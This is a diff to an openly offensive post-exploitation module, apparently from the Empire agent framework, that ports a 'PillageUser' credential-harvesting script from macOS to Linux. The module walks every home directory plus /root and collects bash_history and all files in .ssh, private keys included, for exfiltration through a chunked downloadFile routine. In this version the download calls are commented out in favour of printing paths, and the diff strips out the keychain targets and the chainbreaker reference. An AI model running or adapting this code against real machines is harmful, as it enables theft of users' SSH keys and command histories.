@@ -5,15 +5,14 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'PillageUser',
+            'Name': 'Linux PillageUser',
 
             # list of one or more authors for the module
             'Author': ['@harmj0y'],
 
             # more verbose multi-line description of the module
-            'Description': ("Pillages the current user for their keychain, bash_history, ssh known hosts, "
-                            "recent folders, etc. For logon.keychain, use https://github.com/n0fate/chainbreaker ."
-                            "For other .plist files, check https://davidkoepi.wordpress.com/2013/07/06/macforensics5/"),
+            'Description': ("Pillages the current user for their bash_history, ssh known hosts, "
+                            "recent folders, etc. "),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -28,9 +27,7 @@ class Module:
             'OpsecSafe' : True,
 
             # list of any references/other comments
-            'Comments': [
-                "https://davidkoepi.wordpress.com/2013/07/06/macforensics5/"
-            ]
+            'Comments': []
         }
 
         # any options needed by the module, settable during runtime
@@ -114,25 +111,29 @@ def downloadFile(path):
             partIndex += 1
             offset += 5120000
 
-searchPaths = ['/Library/Keychains/login.keychain', '/.bash_history', '/Library/Preferences/com.apple.finder.plist', '/Library/Preferences/com.apple.recentitems.plist', '/Library/Preferences/com.apple.Preview.plist' ]
+searchPaths = ['/.bash_history']
 
 if "%(allUsers)s".lower() == "true":
-    d='/Users/'
+    d='/home/'
     userPaths = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
+    userPaths += ["/root/"]
 else:
     userPaths = ['~/']
 
 for userPath in userPaths:
     for searchPath in searchPaths:
-        downloadFile(userPath + searchPath)
+        #downloadFile(userPath + searchPath)
+        print userPath + searchPath
 
-# grab all .ssh files
-filePath = os.path.expanduser('~/.ssh/')
-sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
-for sshFile in sshFiles:
-    downloadFile('~/.ssh/' + sshFile)
+    # grab all .ssh files
+    filePath = os.path.expanduser(userPath + '/.ssh/')
+    if os.path.exists(filePath):
+        sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
+        for sshFile in sshFiles:
+            # downloadFile(userPath + '/.ssh/' + sshFile)
+            print userPath + '/.ssh/' + sshFile
 
-print "pillaging complete, if login.keychain recovered, use chainbreaker with the user password"
+print "pillaging complete"
 """ % {'sleep': sleep, 'allUsers': allUsers}
 
         return script
